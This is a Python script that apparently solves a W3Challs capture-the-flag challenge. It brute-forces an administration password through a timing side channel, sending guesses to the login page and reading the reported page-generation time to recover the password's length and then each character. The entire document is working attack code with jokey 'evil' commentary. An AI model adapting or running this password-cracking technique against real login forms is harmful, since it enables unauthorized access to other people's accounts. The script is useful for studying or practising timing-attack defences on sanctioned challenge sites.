#!python3
import requests
import string
import re

protocol = "http"
domain = "temporal.hax.w3challs.com"
page_name = "/administration.php"
pwd_lengths = range(1,20);
pwd_chars = string.ascii_lowercase;
success_login_string = "Congratulations"
elapsed_time_re = "page generated in (\d+) ms"
guessed_char_delay_ms = 150

s = requests.Session();

# PROBING:
print("Probing honest behavior (now I am an angel)...", end='', flush=True)
url = protocol + "://" + domain + page_name
payload = {"your_password": "vuoi farla ingelosirla?"}
response = s.post(url, data=payload)
if response.status_code != requests.codes.ok: 
   exit("Status code not OK")
if success_login_string in response.text:
   exit("PASSWORD GUESSED WHILE PROBING HONEST BEHAVIOR 8-| ... (no comment)")

print("OK")

# GUESSING PWD LEN + FIRST CHAR:
print("Bruteforcing pwd length and first char... (now I'm getting evil ;D )")
stop_attack = False
for pwd_length in list(pwd_lengths):
   for pwd_char in pwd_chars:
      pwd = pwd_char*pwd_length
      print(pwd)
      payload = {"your_password": pwd}
      response = s.post(url, data=payload)
      if response.status_code != requests.codes.ok: 
         exit("Status code not OK")
      #print(response.text)
      z = re.search(elapsed_time_re, response.text)
      if not z:
         exit("WTF??")
      elapsed = int(z.group(1))
      if elapsed > guessed_char_delay_ms:
         print(pwd + " produced " + str(elapsed) + " ms response")
         first_char = pwd_char;
         stop_attack = True
         break
   if stop_attack:
      break
if not stop_attack:
   exit("Uff! Cannot guess pwd length. Maybe pwd is too long? :-(")

# GUESSING OTHER CHARS:
print("Bruteforcing other chars... (blood! blood! BLOOD! >8-D )")
for char_i in range(1, pwd_length):
   for pwd_char in pwd_chars:
      pwd = pwd[0:char_i] + pwd_char + pwd[char_i+1:]
      print(pwd)
      payload = {"your_password": pwd}
      response = s.post(url, data=payload)
      if response.status_code != requests.codes.ok: 
         exit("Status code not OK")
      #print(response.text)
      z = re.search(elapsed_time_re, response.text)
      if not z:
         exit("WTF??")
      elapsed = int(z.group(1))
      if elapsed > guessed_char_delay_ms*(char_i+1):
         print(pwd + " produced " + str(elapsed) + " ms response")
         break

print()
print("PASSWORD BROKEN: " + pwd + " (easy as a piece of cake)")

